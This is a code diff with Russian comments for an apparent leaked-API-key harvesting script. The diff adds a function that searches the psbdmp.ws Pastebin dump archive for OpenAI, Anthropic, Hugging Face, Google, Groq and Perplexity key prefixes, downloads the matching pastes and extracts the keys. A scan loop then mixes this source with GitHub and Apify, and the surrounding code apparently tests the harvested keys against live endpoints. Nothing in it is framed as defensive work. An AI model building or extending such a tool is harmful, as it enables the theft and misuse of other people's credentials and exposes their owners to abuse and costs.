@@ -311,6 +311,63 @@ def fetch_apify_targets():
         logger.error(f"❌ Ошибка Apify ({actor_choice}): {e}")
         return []
 
+# ─── ПАРСИНГ PSBDMP.WS (С ЗАГРУЗКОЙ ТЕКСТА) ────────────────────────────────
+def fetch_psbdmp_targets():
+    logger.info("📋 Ищу ключи на Pastebin (psbdmp.ws)...")
+    targets = []
+    
+    search_terms = ["sk-", "hf_", "sk-proj-", "sk-ant-", "AIzaSy", "pplx-", "gsk_"]
+    max_pastes_per_term = 5 
+    
+    for term in search_terms:
+        try:
+            url = f"https://psbdmp.ws/api/search/v3/{term}"
+            resp = requests.get(url, timeout=15)
+            
+            if resp.status_code == 404:
+                continue
+            if resp.status_code != 200:
+                logger.warning(f"⚠️ psbdmp.ws вернул {resp.status_code} для '{term}'")
+                continue
+                
+            data = resp.json()
+            
+            # ИСПРАВЛЕНО: API может вернуть список напрямую
+            if isinstance(data, list):
+                pastes = data
+            elif isinstance(data, dict):
+                pastes = data.get("data", [])
+            else:
+                pastes = []
+            
+            for paste in pastes[:max_pastes_per_term]:
+                paste_id = paste.get("id")
+                if not paste_id:
+                    continue
+                
+                dump_url = f"https://psbdmp.ws/api/v3/dump/{paste_id}"
+                dump_resp = requests.get(dump_url, timeout=10)
+                
+                if dump_resp.status_code == 200:
+                    dump_data = dump_resp.json()
+                    content = dump_data.get("content", "")
+                    
+                    if content:
+                        extracted = extract_keys_from_text(content)
+                        targets.extend(extracted)
+                        if extracted:
+                            logger.info(f"   └ Найдено {len(extracted)} ключей в пасте {paste_id}")
+                else:
+                    logger.warning(f"   └ Не удалось загрузить пасту {paste_id} (код {dump_resp.status_code})")
+                    
+            time.sleep(0.5)
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка psbdmp.ws для '{term}': {e}")
+            
+    logger.info(f"✅ psbdmp.ws: всего найдено целей: {len(targets)}")
+    return targets
+
 # ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
     try:
@@ -357,12 +414,13 @@ async def long_scan_loop():
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        # 60% - GitHub, 20% - Jungle, 20% - TheScrapelab
         chance = random.random()
-        if chance < 0.6:
+        if chance < 0.5:
             targets = await asyncio.to_thread(fetch_github_targets)
-        else:
+        elif chance < 0.75:
             targets = await asyncio.to_thread(fetch_apify_targets)
+        else:
+            targets = await asyncio.to_thread(fetch_psbdmp_targets)
             
         total_checked += len(targets)
         # ... дальше идет цикл for t in targets: (его менять не нужно)
